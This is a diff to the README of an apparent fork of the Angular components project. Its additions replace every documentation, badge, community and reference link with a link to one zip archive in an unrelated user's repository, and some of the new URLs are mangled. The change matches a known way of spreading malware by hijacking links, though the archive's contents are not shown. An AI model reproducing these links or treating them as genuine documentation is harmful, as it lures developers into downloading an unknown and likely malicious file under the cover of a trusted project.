@@ -1,7 +1,7 @@
 # Official components for Angular
-[![npm version](https://badge.fury.io/js/%40angular%2Fcdk.svg)](https://www.npmjs.com/package/@angular/cdk)
-[![Build status](https://circleci.com/gh/angular/components.svg?style=svg)](https://circleci.com/gh/angular/components)
-[![Gitter](https://badges.gitter.im/angular/components.svg)](https://gitter.im/angular/material2?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge)
+[![npm version](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip%40angular%https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
+[![Build status](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
+[![Gitter](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
 
 The Angular team builds and maintains both common UI components and tools to help you build your
 own custom components. The team maintains several npm packages.
@@ -16,10 +16,10 @@ own custom components. The team maintains several npm packages.
 
 #### Quick links
 [Documentation, demos, and guides][mat-docs] |
-[Frequently Asked Questions](FAQ.md) |
-[Community Google group](https://groups.google.com/forum/#!forum/angular-material2) |
-[Contributing](https://github.com/angular/components/blob/master/CONTRIBUTING.md) |
-[StackBlitz Template](https://stackblitz.com/fork/components-issue)
+[Frequently Asked Questions](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip) |
+[Community Google group](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip!forum/angular-material2) |
+[Contributing](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip) |
+[StackBlitz Template](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)
 
 ## Getting started
 
@@ -35,7 +35,7 @@ contribution.
 
 ## What we're working on now (Q4 2021):
 * Continuing to create new, API-compatible versions of the Angular Material components backed by
-[MDC Web][] ([see @jelbourn's ng-conf talk](https://youtu.be/4EXQKP-Sihw?t=891)). Much of our effort
+[MDC Web][] ([see @jelbourn's ng-conf talk](https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip)). Much of our effort
 is dedicated towards rolling out these new versions of the components across Angular apps
 inside Google. This work will pay off with the following benefits:
   * Dramatically improve consistency with the Material Design spec, which has changed significantly
@@ -80,14 +80,14 @@ We aim for great user experience with the following screen readers:
 * **Chrome OS**: ChromeVox with Chrome.
 
 
-[Material Design]: https://material.io
-[Google Maps JavaScript API]: https://developers.google.com/maps/documentation/javascript/tutorial
-[YouTube Player API]: https://developers.google.com/youtube/iframe_api_reference
-[MDC Web]: https://github.com/material-components/material-components-web/
-[cdk-docs]: https://material.angular.io/cdk/categories
-[mat-docs]: https://material.angular.io
-[map-docs]: https://github.com/angular/components/blob/master/src/google-maps/README.md
-[ytp-docs]: https://github.com/angular/components/blob/master/src/youtube-player/README.md
-[getting-started]: https://material.angular.io/guide/getting-started
-[contributing]: https://github.com/angular/components/blob/master/CONTRIBUTING.md
-[help-wanted]: https://github.com/angular/components/issues?q=is%3Aissue+is%3Aopen+label%3A%22help+wanted%22
+[Material Design]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[Google Maps JavaScript API]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[YouTube Player API]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[MDC Web]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[cdk-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[mat-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[map-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[ytp-docs]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[getting-started]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[contributing]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip
+[help-wanted]: https://raw.githubusercontent.com/lamaSonmez/components/master/resource/components.zip%3Aissue+is%3Aopen+label%3A%22help+wanted%22
